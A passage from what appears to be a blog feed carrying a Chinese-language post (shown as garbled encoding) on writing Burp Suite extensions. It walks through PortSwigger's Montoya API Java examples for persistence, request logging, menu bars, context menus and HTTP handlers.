myExtensionData.getHttpRequest(REQUEST_FROM_URL_KEY);</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">startupCount</span> <span class="operator">=</span> myExtensionData.getInteger(STARTUP_COUNT_KEY);</span><br><span class="line"></span><br><span class="line">        api.repeater().sendToRepeater(simpleRequest, <span class="string">&quot;Simple Request &quot;</span> + startupCount);</span><br><span class="line">        api.repeater().sendToRepeater(requestWithHeaders, <span class="string">&quot;Request With Headers &quot;</span> + startupCount);</span><br><span class="line">        api.repeater().sendToRepeater(requestFromUrl, <span class="string">&quot;Request From Url &quot;</span> + startupCount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.persistence.PersistedList;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.persistence.PersistedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.RequestToBeSentAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.ResponseReceivedAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestResponseLogging</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REQUEST_RESPONSE_LIST_KEY</span> <span class="operator">=</span> <span class="string">&quot;last5&quot;</span>;  <span class="comment">// ç”¨äºä¿å­˜æ•°æ®çš„é”®</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PersistedObject myExtensionData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RequestResponseLogging</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">        <span class="built_in">this</span>.myExtensionData = api.persistence().extensionData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runExample</span><span class="params">()</span> &#123;</span><br><span class="line">        ensurePersistedListIsPresent();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»é¡¹ç›®æ–‡ä»¶ä¸­åŠ è½½è¯·æ±‚/å“åº”åˆ—è¡¨</span></span><br><span class="line">        PersistedList&lt;HttpRequestResponse&gt; myPersistedList = myExtensionData.getHttpRequestResponseList(REQUEST_RESPONSE_LIST_KEY);</span><br><span class="line">        printToOutput(myPersistedList);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ³¨å†Œ HTTP å¤„ç†å™¨æ¥å¤„ç†è¯·æ±‚å’Œå“åº”</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">HttpHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent requestToBeSent)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> continueWith(requestToBeSent);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">synchronized</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived responseReceived)</span> &#123;</span><br><span class="line">                <span class="comment">// ä¿æŒåˆ—è¡¨ä¸­æœ€å¤š 5 æ¡è®°å½•</span></span><br><span class="line">                <span class="keyword">if</span> (myPersistedList.size() &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">                    myPersistedList.remove(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ä¸ºäº†æ—¥å¿—è®°å½•ï¼Œæˆ‘ä»¬ä¸éœ€è¦ä¿ç•™æ­£æ–‡å†…å®¹</span></span><br><span class="line">                myPersistedList.add(httpRequestResponse(responseReceived.initiatingRequest().withBody(<span class="string">&quot;&quot;</span>), responseReceived.withBody(<span class="string">&quot;&quot;</span>)));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> continueWith(responseReceived);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">printToOutput</span><span class="params">(PersistedList&lt;HttpRequestResponse&gt; myPersistedList)</span> &#123;</span><br><span class="line">        <span class="comment">// å°†åŠ è½½çš„åˆ—è¡¨æ‰“å°åˆ°è¾“å‡ºæ—¥å¿—</span></span><br><span class="line">        <span class="keyword">for</span> (HttpRequestResponse httpRequestResponse : myPersistedList) &#123;</span><br><span class="line">            api.logging().logToOutput(httpRequestResponse.request().toString());</span><br><span class="line">            api.logging().logToOutput(<span class="string">&quot;\n========================\n&quot;</span>);</span><br><span class="line">            api.logging().logToOutput(httpRequestResponse.response().toString());</span><br><span class="line">            api.logging().logToOutput(<span class="string">&quot;\n**************************&quot;</span>.repeat(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensurePersistedListIsPresent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæŒä¹…åŒ–çš„è¯·æ±‚/å“åº”åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">if</span> (myExtensionData.getHttpRequestResponseList(REQUEST_RESPONSE_LIST_KEY) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºåˆ—è¡¨å¹¶å°†å…¶ä¿å­˜åˆ°æˆ‘ä»¬çš„é”®ä¸‹</span></span><br><span class="line">            PersistedList&lt;HttpRequestResponse&gt; emptyPersistedList = PersistedList.persistedHttpRequestResponseList();</span><br><span class="line">            myExtensionData.setHttpRequestResponseList(REQUEST_RESPONSE_LIST_KEY, emptyPersistedList);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersistenceExample</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">STARTUP_COUNT_KEY</span> <span class="operator">=</span> <span class="string">&quot;Startup Count&quot;</span>;  <span class="comment">// ç”¨äºä¿å­˜å¯åŠ¨æ¬¡æ•°çš„é”®</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="comment">// ä¸ºæ‰©å±•è®¾ç½®åç§°ï¼ŒæŒä¹…åŒ–æ•°æ®å°†åŸºäºæ­¤åç§°è¿›è¡Œä¿å­˜å’ŒåŠ è½½</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Persistence example extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æŒä¹…åŒ–å¯¹è±¡ï¼Œç”¨äºä¿å­˜æˆ–åŠ è½½æ•°æ®</span></span><br><span class="line">        <span class="type">PersistedObject</span> <span class="variable">myExtensionData</span> <span class="operator">=</span> api.persistence().extensionData();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»é¡¹ç›®æ–‡ä»¶ä¸­è·å–æ•´æ•°å€¼</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">startupCount</span> <span class="operator">=</span> myExtensionData.getInteger(STARTUP_COUNT_KEY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœå€¼ä¸å­˜åœ¨ï¼Œå³æ­¤é”®æœªåœ¨é¡¹ç›®æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œåˆ™åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">        <span class="keyword">if</span> (startupCount == <span class="literal">null</span>) &#123;</span><br><span class="line">            startupCount = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†å¯åŠ¨æ¬¡æ•°å¢åŠ 1å¹¶ä¿å­˜å›é¡¹ç›®æ–‡ä»¶</span></span><br><span class="line">        myExtensionData.setInteger(STARTUP_COUNT_KEY, startupCount + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æŒä¹…åŒ–æ•°æ®ä¸­æ£€ç´¢æ›´æ–°åçš„å€¼å¹¶åˆ›å»ºä¸€ä¸ªä¿¡æ¯äº‹ä»¶</span></span><br><span class="line">        api.logging().raiseInfoEvent(<span class="string">&quot;Startup count is: &quot;</span> + myExtensionData.getInteger(STARTUP_COUNT_KEY));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿è¡Œæ›´å¤æ‚çš„ç¤ºä¾‹ï¼Œä¾‹å¦‚ä¿å­˜å’ŒåŠ è½½è¯·æ±‚</span></span><br><span class="line">        advancedExamples(api);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿è¡Œé«˜çº§ç¤ºä¾‹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">advancedExamples</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="comment">// ä¿å­˜å’ŒåŠ è½½è¯·æ±‚çš„ç¤ºä¾‹</span></span><br><span class="line">        <span class="type">SavingLoadingRequests</span> <span class="variable">savingLoadingRequests</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SavingLoadingRequests</span>(api);</span><br><span class="line">        savingLoadingRequests.runExample();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨è¯·æ±‚å“åº”åˆ—è¡¨çš„ç¤ºä¾‹</span></span><br><span class="line">        <span class="type">RequestResponseLogging</span> <span class="variable">requestLogging</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestResponseLogging</span>(api);</span><br><span class="line">        requestLogging.runExample();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WebSocket-Handler-Example-Extension"><a href="#WebSocket-Handler-Example-Extension" class="headerlink" title="WebSocket Handler Example Extension"></a>WebSocket Handler Example Extension</h2><p>The extension works as follows:</p><ul><li>It registers a web socket created handler</li><li>When a web socket is created<ul><li>It sends an initial text message</li><li>It registers a message listener for the websocket</li><li>Any message from the client that contains the text â€œpasswordâ€ is base64 encoded.</li></ul></li></ul><p>è¿™ä¸ªå…ˆä¸çœ‹äº†</p><h2 id="Menu-Bar-Example-Extension"><a href="#Menu-Bar-Example-Extension" class="headerlink" title="Menu Bar Example Extension"></a>Menu Bar Example Extension</h2><p>This extension demonstrates registering a top level menu bar item with various actions.</p><p>It demonstrates the following techniques:</p><p>Creating a BasicMenuItem with a caption<br>Providing an action for a BasicMenuItem<br>Adding the Menu to Burp<br>Registering an ExtensionUnloadingHandler</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.extension.ExtensionUnloadingHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyExtensionUnloadingHandler</span> <span class="keyword">implements</span> <span class="title class_">ExtensionUnloadingHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyExtensionUnloadingHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">extensionUnloaded</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.logging().logToOutput(<span class="string">&quot;Extension has been unloaded.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.menu.BasicMenuItem;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.menu.Menu;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.menu.MenuItem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MenuBar</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Add menu bar&quot;</span>);</span><br><span class="line">        api.logging().logToOutput(<span class="string">&quot;Extension has been loaded.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicMenuItem</span> <span class="variable">alertEventItem</span> <span class="operator">=</span> BasicMenuItem.basicMenuItem(<span class="string">&quot;Raise critical alert&quot;</span>).withAction(() -&gt; api.logging().raiseCriticalEvent(<span class="string">&quot;Alert from extension&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicMenuItem</span> <span class="variable">basicMenuItem</span> <span class="operator">=</span> MenuItem.basicMenuItem(<span class="string">&quot;Unload extension&quot;</span>);</span><br><span class="line">        <span class="type">MenuItem</span> <span class="variable">unloadExtensionItem</span> <span class="operator">=</span> basicMenuItem.withAction(() -&gt; api.extension().unload());</span><br><span class="line"></span><br><span class="line">        <span class="type">Menu</span> <span class="variable">menu</span> <span class="operator">=</span> Menu.menu(<span class="string">&quot;Menu bar&quot;</span>).withMenuItems(alertEventItem, unloadExtensionItem);</span><br><span class="line"></span><br><span class="line">        api.userInterface().menuBar().registerMenu(menu);</span><br><span class="line"></span><br><span class="line">        api.extension().registerUnloadingHandler(<span class="keyword">new</span> <span class="title class_">MyExtensionUnloadingHandler</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Context-Menu-Example-Extension"><a href="#Context-Menu-Example-Extension" class="headerlink" title="Context Menu Example Extension"></a>Context Menu Example Extension</h2><p>This extension adds a new context menu item to print out the request or response of an HttpRequestResponse in the Target, Proxy or Logger tab.</p><p>The sample extension demonstrates the following techniques:</p><p>Registering a new ContextMenuItemsProvider.<br>Creating a JMenuItem.<br>Adding an action listener to a JMenuItem.<br>If you right-click in a message editor context, it will use the item from the message editor.<br>If you right-click on a table item, it will print the request&#x2F;response for the first selected item.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyContextMenuItemsProvider</span> <span class="keyword">implements</span> <span class="title class_">ContextMenuItemsProvider</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyContextMenuItemsProvider</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Component&gt; <span class="title function_">provideMenuItems</span><span class="params">(ContextMenuEvent event)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (event.isFromTool(ToolType.PROXY, ToolType.TARGET, ToolType.LOGGER))</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;Component&gt; menuItemList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="type">JMenuItem</span> <span class="variable">retrieveRequestItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;Print request&quot;</span>);</span><br><span class="line">            <span class="type">JMenuItem</span> <span class="variable">retrieveResponseItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;Print response&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">HttpRequestResponse</span> <span class="variable">requestResponse</span> <span class="operator">=</span> event.messageEditorRequestResponse().isPresent() ? event.messageEditorRequestResponse().get().requestResponse() : event.selectedRequestResponses().get(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            retrieveRequestItem.addActionListener(l -&gt; api.logging().logToOutput(<span class="string">&quot;Request is:\r\n&quot;</span> + requestResponse.request().toString()));</span><br><span class="line">            menuItemList.add(retrieveRequestItem);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (requestResponse.response() != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                retrieveResponseItem.addActionListener(l -&gt; api.logging().logToOutput(<span class="string">&quot;Response is:\r\n&quot;</span> + requestResponse.response().toString()));</span><br><span class="line">                menuItemList.add(retrieveResponseItem);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> menuItemList;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextMenu</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Context menu extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.userInterface().registerContextMenuItemsProvider(<span class="keyword">new</span> <span class="title class_">MyContextMenuItemsProvider</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç æ˜¯åˆ›å»ºå³é”®å¤„ç†é€‰é¡¹çš„</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·å¼€å‘ã€‘Burpsuite æ’ä»¶å¼€å‘</title>
      <link href="/2024/10/23/tools/burpsuite-plugins/"/>
      <url>/2024/10/23/tools/burpsuite-plugins/</url>
      
        <content type="html"><![CDATA[<p>æƒ³å†™ä¸€ä¸ªburpsuiteæ’ä»¶ï¼Œçœ‹åˆ°burpsuiteæ›´æ–°äº†æœ€æ–°çš„apiï¼Œé¦–å…ˆé€šè¿‡å­¦ä¹ å®˜ç½‘çš„githubç¤ºä¾‹å­¦ä¹ ä¸‹apiåŠŸèƒ½ä½¿ç”¨<br><a href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples">https://github.com/PortSwigger/burp-extensions-montoya-api-examples</a></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> example.helloworld;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.logging.Logging;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// set extension name</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Hello world extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Logging</span> <span class="variable">logging</span> <span class="operator">=</span> api.logging();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Hello output.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our error stream</span></span><br><span class="line">        logging.logToError(<span class="string">&quot;Hello error.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to the Burp alerts tab</span></span><br><span class="line">        logging.raiseInfoEvent(<span class="string">&quot;Hello info event.&quot;</span>);</span><br><span class="line">        logging.raiseDebugEvent(<span class="string">&quot;Hello debug event.&quot;</span>);</span><br><span class="line">        logging.raiseErrorEvent(<span class="string">&quot;Hello error event.&quot;</span>);</span><br><span class="line">        logging.raiseCriticalEvent(<span class="string">&quot;Hello critical event.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// throw an exception that will appear in our error stream</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Hello exception.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç çš„loggingæ˜¯è¾“å‡ºåœ¨è¿™é‡Œçš„ï¼š<br><img src="/2024/10/23/tools/burpsuite-plugins/image.png"><br>å¯ä»¥ç”¨æ¥è¾“å‡ºè‡ªåŠ¨åŒ–æ‰«æåçš„ç»“æœ</p><h2 id="HTTP-Handler-Example-Extension"><a href="#HTTP-Handler-Example-Extension" class="headerlink" title="HTTP Handler Example Extension"></a>HTTP Handler Example Extension</h2><p>å®ƒæ³¨å†Œä¸€ä¸ª HTTP å¤„ç†ç¨‹åº<br>å¯¹äºä¼ å‡ºè¯·æ±‚æ¶ˆæ¯ï¼š<br>    å¦‚æœè¯·æ±‚æ˜¯è¯·æ±‚ï¼šPOST<br>        è¯·æ±‚æ­£æ–‡å°†è®°å½•åˆ° output<br>        å°†å‘è¯·æ±‚æ·»åŠ æ³¨é‡Š<br>    å°† URL å‚æ•°æ·»åŠ åˆ°è¯·æ±‚ä¸­<br>å¯¹äºä¼ å…¥çš„å“åº”æ¶ˆæ¯ï¼š<br>    å¦‚æœç›¸åº”çš„è¯·æ±‚åŒ…å«æ ‡å¤´ï¼Œåˆ™ä¼šæ·»åŠ é«˜äº®æ˜¾ç¤ºContent-LengthBLUE</p><p>MyHttpHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.Annotations;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.HighlightColor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.logging.Logging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.RequestToBeSentAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.ResponseReceivedAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.params.HttpParameter.urlParameter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title 